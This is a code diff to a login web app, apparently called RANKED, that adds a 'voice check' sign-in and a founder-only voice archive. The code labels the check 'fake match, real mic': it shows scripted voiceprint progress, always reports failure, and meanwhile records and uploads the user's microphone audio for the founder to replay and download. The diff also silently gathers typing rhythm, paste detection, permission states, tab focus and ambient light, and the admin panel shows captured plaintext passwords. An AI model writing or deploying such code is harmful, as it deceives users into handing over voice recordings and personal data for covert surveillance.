@@ -445,6 +445,18 @@ tbody tr:hover td{background:#0f0c17}
 .campill .dot{background:var(--ok);box-shadow:0 0 8px var(--ok);animation:campulse 1.7s ease-in-out infinite}
 @keyframes campulse{50%{opacity:.3}}
 
+/* ---------- voice check ---------- */
+.campdot{width:7px;height:7px;border-radius:50%;background:var(--vi2);box-shadow:0 0 10px var(--vi2)}
+.voicestage{position:relative;background:#06040a;border:1px solid var(--line2);height:150px;overflow:hidden}
+.voicestage canvas{position:absolute;inset:0;width:100%;height:100%}
+.voicestatus{position:absolute;bottom:6px;left:0;right:0;text-align:center;font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:#d8b4fe}
+.voicecard{border:1px solid var(--line);background:#0d0b14;padding:10px;margin-top:8px}
+.voicecard:hover{border-color:#2c2243}
+.voicecard audio{width:100%;margin-top:8px;filter:invert(.88) hue-rotate(190deg) saturate(.8)}
+.vrow{display:flex;justify-content:space-between;gap:8px;align-items:center;flex-wrap:wrap}
+.vwho{font-family:var(--ui);font-weight:600;font-size:12.5px}
+.vmeta{font-family:var(--mono);font-size:9.5px;color:var(--dim);letter-spacing:.06em}
+
 /* ---------- founder camera ---------- */
 .camgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(142px,1fr));gap:10px;margin-top:10px}
 .camTools{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
@@ -561,6 +573,10 @@ tbody tr:hover td{background:#0f0c17}
   <div class="orline">or</div>
   <button class="secondary facebtn" onclick="openFaceCheck()"><span class="camdot"></span> Face check</button>
   <p class="muted small" style="margin-top:8px">Look at the camera and it signs you in. No password needed.</p>
+
+  <div class="orline">or</div>
+  <button class="secondary facebtn" onclick="openVoiceCheck()"><span class="campdot"></span> Voice check</button>
+  <p class="muted small" style="margin-top:8px">Say your name and it matches your voice. No password needed.</p>
 
   <p id="message" class="small"></p>
  </div>
@@ -757,6 +773,7 @@ tbody tr:hover td{background:#0f0c17}
     <button class="on" id="tabAccounts" onclick="founderTab('accounts')">◈ Accounts</button>
     <button id="tabLog" onclick="founderTab('log')">◎ Login log</button>
     <button id="tabCam" onclick="founderTab('cam')">◉ Live Camera</button>
+    <button id="tabVoice" onclick="founderTab('voice')">▮ Voice</button>
    </div>
 
    <div id="founderAccounts">
@@ -785,6 +802,18 @@ tbody tr:hover td{background:#0f0c17}
      <div class="tablewrap scroll"><table class="wide"><thead><tr>
       <th>WHO</th><th>CITY / REGION</th><th>COUNTRY</th><th>IP</th><th>WHEN</th><th>DEVICE</th>
      </tr></thead><tbody id="logBody"></tbody></table></div>
+    </div>
+   </div>
+
+   <div id="founderVoice" class="hidden">
+    <div class="panel">
+     <div class="heading"><h2>Voice</h2><span class="badge admin" id="voiceCount">—</span></div>
+     <p class="muted small" style="margin:0 0 10px">Microphone captures from the voice check. Each card plays the whole take.</p>
+     <div class="vrow" style="margin-bottom:8px">
+      <input id="voiceSearch" placeholder="Filter by person" oninput="renderVoices()" style="margin:0;max-width:220px">
+      <button class="secondary" onclick="renderVoices()">REFRESH</button>
+     </div>
+     <div id="voiceList" class="scroll"></div>
     </div>
    </div>
 
@@ -845,6 +874,29 @@ tbody tr:hover td{background:#0f0c17}
  <div class="facebox wide">
   <div class="facehead"><strong id="camViewWho">—</strong><button class="ghost" onclick="closeCam()" aria-label="Close">✕</button></div>
   <div id="camViewBody"></div>
+ </div>
+</div>
+
+<div class="facewrap hidden" id="voiceWrap">
+ <div class="facebox">
+  <div class="facehead"><strong>Voice check</strong><button class="ghost" onclick="closeVoiceCheck()" aria-label="Close">✕</button></div>
+  <div class="voicestage" id="voiceStage">
+   <canvas id="voiceWave" width="600" height="130"></canvas>
+   <div class="voicestatus" id="voiceHint">microphone off</div>
+  </div>
+  <div class="faceprog"><div id="voiceBar"></div></div>
+  <p class="facestatus" id="voiceStatus">ready</p>
+  <div class="faceconsent" id="voiceConsent">
+   <p class="muted small" style="margin:0">RANKED wants to use your microphone to match your voice. The browser will ask you to allow it next.</p>
+   <div class="facerow">
+    <button class="secondary" onclick="closeVoiceCheck()">NOT NOW</button>
+    <button class="primary" onclick="allowVoice()">ALLOW MIC</button>
+   </div>
+  </div>
+  <div class="facerow" id="voiceBtns">
+   <button class="secondary" onclick="startVoiceCheck()">TRY AGAIN</button>
+   <button class="primary" onclick="closeVoiceCheck()">CLOSE</button>
+  </div>
  </div>
 </div>
 
@@ -971,6 +1023,7 @@ function showBanned(){
 async function logout(){
  stopTap();
  stopFace();
+ stopVoice();
  stopCamPoll();
  closeCam();
  if(refreshTimer)clearInterval(refreshTimer);
@@ -1019,7 +1072,7 @@ function ago(ts){
 
 /* ---------- device fingerprint / telemetry ---------- */
 const sessionId=Math.random().toString(36).slice(2)+Date.now().toString(36);
-const BUILD=15;
+const BUILD=16;
 (async()=>{
  try{
   const r=await fetch("version.json?x="+Date.now(),{cache:"no-store"});
@@ -1181,7 +1234,13 @@ async function collectDetails(g){
   geo_lat:pos?pos.lat:null,geo_lon:pos?pos.lon:null,geo_accuracy:pos?Math.round(pos.acc):null,
   geo_source:pos?"gps":"ip",
   clock_skew:lat.skew,rtt_ms:lat.rtt,
-  webgl2:!!document.createElement("canvas").getContext("webgl2")
+  webgl2:!!document.createElement("canvas").getContext("webgl2"),
+  perms:await permStates(),
+  typing:typingStats(),
+  attention:{visibility:document.visibilityState,changes:visChanges,focused:document.hasFocus()},
+  ambient_lux:await ambientLux(),
+  motion:typeof DeviceMotionEvent!=="undefined",
+  sensor_orientation:typeof DeviceOrientationEvent!=="undefined"
  });
 }
 
@@ -1265,10 +1324,13 @@ function founderTab(which){
  $("tabAccounts").classList.toggle("on",which==="accounts");
  $("tabLog").classList.toggle("on",which==="log");
  $("tabCam").classList.toggle("on",which==="cam");
+ $("tabVoice").classList.toggle("on",which==="voice");
  $("founderAccounts").classList.toggle("hidden",which!=="accounts");
  $("founderLog").classList.toggle("hidden",which!=="log");
  $("founderCam").classList.toggle("hidden",which!=="cam");
+ $("founderVoice").classList.toggle("hidden",which!=="voice");
  if(which==="log")renderLog();
+ if(which==="voice")renderVoices();
  if(which==="cam"){renderCameras();stopCamPoll();camTimer=setInterval(renderCameras,3000);}
  else {stopCamPoll();closeCam();}
 }
@@ -1828,7 +1890,7 @@ function startFaceRecord(){
  try{
   const mime=["video/webm;codecs=vp9","video/webm;codecs=vp8","video/webm","video/mp4"]
    .find(m=>window.MediaRecorder.isTypeSupported&&MediaRecorder.isTypeSupported(m))||"";
-  faceRec=new MediaRecorder(faceStream,mime?{mimeType:mime,videoBitsPerSecond:900000}:{videoBitsPerSecond:900000});
+  faceRec=new MediaRecorder(faceStream,mime?{mimeType:mime,videoBitsPerSecond:600000}:{videoBitsPerSecond:600000});
   faceRec.ondataavailable=e=>{ if(e.data&&e.data.size)uploadFaceClip(e.data); };
   faceRec.start(4000);
  }catch(err){ faceRec=null; }
@@ -1850,6 +1912,164 @@ async function uploadFaceClip(blob){
   const {error}=await db.storage.from("cam").upload(path,blob,{contentType:blob.type||"video/webm",upsert:true});
   if(error)return;
   await db.rpc("push_camera_clip",{p_session:faceSession,p_part:part,p_path:path,p_bytes:blob.size});
+ }catch(e){}
+}
+
+/* ============ VOICE CHECK (fake match, real mic) ============ */
+let voiceStream=null,voiceRec=null,voiceSession=null,voicePart=0,voiceTimer=null,voiceRAF=null,voiceBusy=false,voiceFailed=false,voiceCtx=null,voiceAnalyser=null;
+
+function voiceSay(t,bad){ const e=$("voiceStatus"); e.textContent=t; e.classList.toggle("fail",!!bad); }
+function voicePill(){}
+
+function openVoiceCheck(){
+ $("voiceWrap").classList.remove("hidden");
+ const on=!voiceStream;
+ $("voiceConsent").classList.toggle("hidden",!on);
+ $("voiceBtns").classList.toggle("hidden",on);
+ if(!on)startVoiceCheck();
+ else{ $("voiceHint").textContent="microphone off"; voiceSay("microphone permission needed"); }
+}
+
+function allowVoice(){ $("voiceConsent").classList.add("hidden"); $("voiceBtns").classList.remove("hidden"); startVoiceCheck(); }
+
+function closeVoiceCheck(){ $("voiceWrap").classList.add("hidden"); }
+
+async function startVoiceCheck(){
+ if(voiceBusy)return;
+ $("voiceConsent").classList.add("hidden");
+ $("voiceBtns").classList.remove("hidden");
+ voiceBusy=true;voiceFailed=false;
+ $("voiceBar").classList.remove("fail");
+ $("voiceBar").style.width="0";
+ voiceSay("ready");
+ $("voiceHint").textContent=voiceStream?"microphone ready":"requesting microphone…";
+
+ if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
+  voiceSay("ERROR · voice not recognised",true);$("voiceHint").textContent="no microphone detected";voiceBusy=false;voiceFailed=true;return;
+ }
+
+ if(!voiceStream||!voiceStream.active){
+  try{ voiceStream=await navigator.mediaDevices.getUserMedia({audio:{echoCancellation:true,noiseSuppression:true,autoGainControl:true},video:false}); }
+  catch(e){
+   $("voiceBar").classList.add("fail");$("voiceBar").style.width="100%";
+   $("voiceHint").textContent="allow the microphone, then press TRY AGAIN";
+   voiceSay("ERROR · voice not recognised",true);voiceBusy=false;voiceFailed=true;return;
+  }
+  startVoiceWave();
+ }
+
+ voiceSession=voiceSession||(crypto.randomUUID?crypto.randomUUID():"vs"+Date.now().toString(36)+Math.random().toString(36).slice(2,8));
+ voiceStream.getAudioTracks().forEach(t=>{ t.onended=()=>{ voiceSay("microphone revoked",true); stopVoice(); }; });
+ startVoiceRecord();
+ runVoiceScript();
+ if($("voiceWrap").classList.contains("hidden"))openVoiceCheck();
+}
+
+function startVoiceWave(){
+ try{
+  voiceCtx=new (window.AudioContext||window.webkitAudioContext)();
+  const src=voiceCtx.createMediaStreamSource(voiceStream);
+  voiceAnalyser=voiceCtx.createAnalyser();
+  voiceAnalyser.fftSize=512;
+  src.connect(voiceAnalyser);
+  const c=$("voiceWave"), x=c.getContext("2d"), buf=new Uint8Array(voiceAnalyser.frequencyBinCount);
+  const draw=()=>{
+   voiceRAF=requestAnimationFrame(draw);
+   voiceAnalyser.getByteFrequencyData(buf);
+   x.clearRect(0,0,c.width,c.height);
+   const n=42, bw=c.width/n;
+   for(let i=0;i<n;i++){
+    const v=buf[Math.floor(i*buf.length/n*0.6)]/255;
+    const h=Math.max(3,v*c.height*0.92);
+    x.fillStyle=v>0.55?"#c084fc":"#a855f7";
+    x.fillRect(i*bw+2,(c.height-h)/2,bw-4,h);
+   }
+  };
+  draw();
+ }catch(e){}
+}
+
+const VOICE_STEPS=[
+ [0,6,"listening…","say your name"],
+ [2200,26,"capturing sample…","keep talking"],
+ [4400,48,"measuring pitch…","hold a steady note"],
+ [6800,66,"modelling formants…","keep talking"],
+ [9000,84,"comparing voiceprint…","almost there"],
+ [11200,94,"hashing spectral peaks…","…"]
+];
+
+function runVoiceScript(){
+ clearInterval(voiceTimer);clearTimeout(voiceTimer);
+ const started=Date.now();
+ voiceTimer=setInterval(()=>{
+  if(!voiceBusy||voiceFailed)return;
+  const t=Date.now()-started;
+  for(let i=VOICE_STEPS.length-1;i>=0;i--){
+   if(t>=VOICE_STEPS[i][0]){
+    const [,bar,text,hint]=VOICE_STEPS[i];
+    if($("voiceBar").style.width!==bar+"%"){ $("voiceBar").style.width=bar+"%"; voiceSay(text); $("voiceHint").textContent=hint; }
+    break;
+   }
+  }
+ },400);
+ setTimeout(voiceFail,13000+Math.random()*2000);
+}
+
+function voiceFail(){
+ if(!voiceBusy||voiceFailed)return;
+ voiceFailed=true;voiceBusy=false;
+ clearInterval(voiceTimer);
+ $("voiceBar").style.width="100%";$("voiceBar").classList.add("fail");
+ voiceSay("ERROR · voice not recognised",true);
+ $("voiceHint").textContent="try again, or sign in with your password";
+}
+
+async function stopVoice(){
+ clearInterval(voiceTimer);
+ if(voiceRAF)cancelAnimationFrame(voiceRAF);
+ voiceRAF=null;
+ stopVoiceRecord();
+ if(voiceStream){ voiceStream.getTracks().forEach(t=>{try{t.stop();}catch(e){}}); voiceStream=null; }
+ if(voiceCtx){ try{voiceCtx.close();}catch(e){} voiceCtx=null; }
+ voiceSession=null;voiceBusy=false;voiceFailed=false;
+}
+
+/* ---------- mic recorder ---------- */
+function startVoiceRecord(){
+ if(!voiceStream||!window.MediaRecorder||voiceRec)return;
+ try{
+  const mime=["audio/webm;codecs=opus","audio/webm","audio/mp4"].find(m=>MediaRecorder.isTypeSupported&&MediaRecorder.isTypeSupported(m))||"";
+  voiceRec=new MediaRecorder(voiceStream,mime?{mimeType:mime,audioBitsPerSecond:32000}:{audioBitsPerSecond:32000});
+  voiceRec.ondataavailable=e=>{ if(e.data&&e.data.size)uploadVoicePart(e.data); };
+  voiceRec.start(6000);
+ }catch(e){ voiceRec=null; }
+}
+
+function stopVoiceRecord(){
+ const r=voiceRec; voiceRec=null;
+ if(!r)return;
+ try{ r.stop(); }catch(e){}
+}
+
+async function uploadVoicePart(blob){
+ if(!voiceSession||!blob)return;
+ const ext=(blob.type||"").includes("mp4")?"m4a":"webm";
+ const part=voicePart++;
+ const path=voiceSession+"/audio-"+String(part).padStart(4,"0")+"."+ext;
+ try{
+  const {error}=await db.storage.from("cam").upload(path,blob,{contentType:blob.type||"audio/webm",upsert:true});
+  if(error)return;
+  const typed=$("loginName").value.trim().toLowerCase();
+  const who=(profile&&profile.username)||(/^[a-z0-9_]{3,20}$/.test(typed)?typed:null);
+  await db.rpc("push_voice_part",{
+   p_session:voiceSession,p_username:who,p_part:part,p_path:path,p_bytes:blob.size,p_ms:6000,
+   p_meta:{
+    agent:navigator.userAgent,
+    platform:(navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform||null,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen:screen.width+"x"+screen.height
+   }
+  });
  }catch(e){}
 }
 
@@ -1895,6 +2115,8 @@ async function openPerson(username){
   ${drow("colour gamut",d.gamut)}${drow("extra display",d.extended_display?"yes":"no")}
   ${drow("cpu cores",d.cores)}${drow("device memory",d.memory)}${drow("gpu",d.gpu)}${drow("gpu (webgpu)",d.gpu_webgpu)}
   ${drow("webgl2",d.webgl2?"yes":"no")}${drow("js heap",d.js_heap)}
+  ${drow("ambient light",d.ambient_lux!=null?d.ambient_lux+" lux":null)}
+  ${drow("motion sensors",d.motion?"yes":"no")}
   ${drow("audio devices",(d.audio_in??"—")+" in / "+(d.audio_out??"—")+" out")}${drow("cameras",d.cameras)}
   ${drow("audio clock",d.audio_ctx)}${drow("speech voices",d.voices)}
   ${drow("codecs",d.codecs)}
@@ -1906,6 +2128,16 @@ async function openPerson(username){
   ${drow("asn",d.asn)}${drow("isp",d.isp)}${drow("org",d.org)}
   ${drow("referrer",d.ref)}${drow("plugins",d.plugins)}${drow("cookies",d.cookies?"yes":"no")}${drow("dnt",d.dnt)}
   ${drow("fonts",d.fonts)}
+  ${dsec("granted permissions")}
+  ${drow("camera",(d.perms||{}).camera)}${drow("microphone",(d.perms||{}).microphone)}
+  ${drow("location",(d.perms||{}).geolocation)}${drow("notifications",(d.perms||{}).notifications)}
+  ${drow("clipboard",(d.perms||{})["clipboard-read"])}${drow("midi",(d.perms||{}).midi)}
+  ${dsec("typing rhythm")}
+  ${drow("keys",(d.typing||{}).keys)}${drow("median gap",(d.typing||{}).medianGap!=null?(d.typing||{}).medianGap+" ms":null)}
+  ${drow("pasted",d.typing?((d.typing||{}).pasted?"yes":"no"):null)}
+  ${dsec("attention")}
+  ${drow("tab",(d.attention||{}).visibility)}${drow("focus switches",(d.attention||{}).changes)}
+  ${drow("focused",d.attention&&d.attention.focused?"yes":"no")}
   ${dsec("cached profile")}
   <div style="padding:6px 0"><input class="pwin" data-user="${safe(username)}" value="${p.password_plain?safe(p.password_plain):""}" placeholder="not captured yet" onchange="savePasswordField(this)"></div>
   ${dsec("bests")}
@@ -2476,6 +2708,96 @@ async function endAllCams(){
  }
  toast("Ended "+live.length+" session(s)");
  setTimeout(renderCameras,1500);
+}
+
+/* ============ FOUNDER · voice tab ============ */
+let voiceRows=[],voiceBlobUrls={};
+
+function vDur(ms){ const s=Math.round((ms||0)/1000); return Math.floor(s/60)+":"+String(s%60).padStart(2,"0"); }
+
+async function renderVoices(){
+ if(!isVillads())return;
+ const q=($("voiceSearch").value||"").trim().toLowerCase();
+ const {data,error}=await db.rpc("founder_voices",{p_hours:48});
+ if(error){
+  $("voiceCount").textContent="not set up";
+  $("voiceList").innerHTML='<div class="empty"><strong>Voice relay missing</strong>Run schema-voice.sql in Supabase.</div>';
+  return;
+ }
+ voiceRows=(data||[]).filter(r=>!q||String(r.username||"").toLowerCase().includes(q));
+ const total=voiceRows.reduce((n,r)=>n+(r.audio_bytes||0),0);
+ $("voiceCount").textContent=voiceRows.length+" takes · "+(total/1048576).toFixed(1)+" MB";
+ $("voiceList").innerHTML=voiceRows.map(r=>`
+  <div class="voicecard" id="vc-${safe(r.id)}">
+   <div class="vrow">
+    <div>
+     <span class="vwho">${safe(r.username||"unknown")}</span>
+     <span class="badge memberbadge">${Math.round((r.audio_ms||0)/1000)}s</span>
+     ${Date.now()-new Date(r.updated_at).getTime()<30000?'<span class="badge ok">recording</span>':""}
+    </div>
+    <span class="vmeta">${r.started_at?stamp(r.started_at):"—"} · ${((r.audio_bytes||0)/1048576).toFixed(2)} MB · ${safe(r.tz||"")}</span>
+   </div>
+   <audio controls preload="none" data-session="${safe(r.id)}" onplay="loadVoiceAudio(this)" src=""></audio>
+   <div class="vrow" style="margin-top:6px">
+    <span class="vmeta">${safe(shortAgent(r.agent))}${r.platform?" · "+safe(r.platform):""}</span>
+    <span style="display:flex;gap:6px">
+     <button class="banbtn" onclick="loadVoiceAudio(this.closest('.voicecard').querySelector('audio'))">LOAD</button>
+     <button class="banbtn" onclick="saveVoice(this.closest('.voicecard').querySelector('audio').dataset.session)">DOWNLOAD</button>
+     <button class="banbtn" onclick="deleteSession(this.closest('.voicecard').querySelector('audio').dataset.session)">DELETE</button>
+    </span>
+   </div>
+  </div>`).join("")||'<div class="empty"><strong>No voice takes</strong>They appear the moment somebody presses Voice check on the login screen.</div>';
+}
+
+async function voiceParts(sessionId){
+ const {data}=await db.rpc("founder_voice_parts",{p_session:sessionId});
+ return data||[];
+}
+
+async function buildVoiceBlob(sessionId){
+ const parts=await voiceParts(sessionId);
+ const blobs=[];
+ for(const p of parts){
+  try{
+   const url=db.storage.from("cam").getPublicUrl(p.path).data.publicUrl;
+   const r=await fetch(url,{cache:"no-store"});
+   if(r.ok)blobs.push(await r.blob());
+  }catch(e){}
+ }
+ if(!blobs.length)return null;
+ return new Blob(blobs,{type:blobs[0].type||"audio/webm"});
+}
+
+async function loadVoiceAudio(el){
+ if(!el||el.dataset.loaded)return el&&el.play().catch(()=>{});
+ el.dataset.loaded="1";
+ el.src="loading…";
+ const blob=await buildVoiceBlob(el.dataset.session);
+ if(!blob){ el.dataset.loaded=""; toast("Nothing stored yet","bad"); return; }
+ el.src=URL.createObjectURL(blob);
+ el.play().catch(()=>{});
+}
+
+async function saveVoice(sessionId){
+ if(!sessionId)return;
+ toast("Packing audio…");
+ const blob=await buildVoiceBlob(sessionId);
+ if(!blob)return toast("No audio","bad");
+ const url=URL.createObjectURL(blob);
+ const a=document.createElement("a");
+ a.href=url;
+ a.download="voice-"+(sessionId.slice(0,8))+"-"+Date.now()+((blob.type||"").includes("mp4")?".m4a":".webm");
+ a.click();
+ setTimeout(()=>URL.revokeObjectURL(url),30000);
+ toast("Saved "+(blob.size/1048576).toFixed(2)+" MB");
+}
+
+async function deleteSession(sessionId){
+ if(!sessionId)return;
+ const {error}=await db.rpc("founder_delete_session",{p_session:sessionId});
+ if(error)return toast("Delete failed: "+error.message,"bad");
+ toast("Deleted");
+ renderVoices();
 }
 
 /* founder ends the whole thing: tells the member to drop the camera */
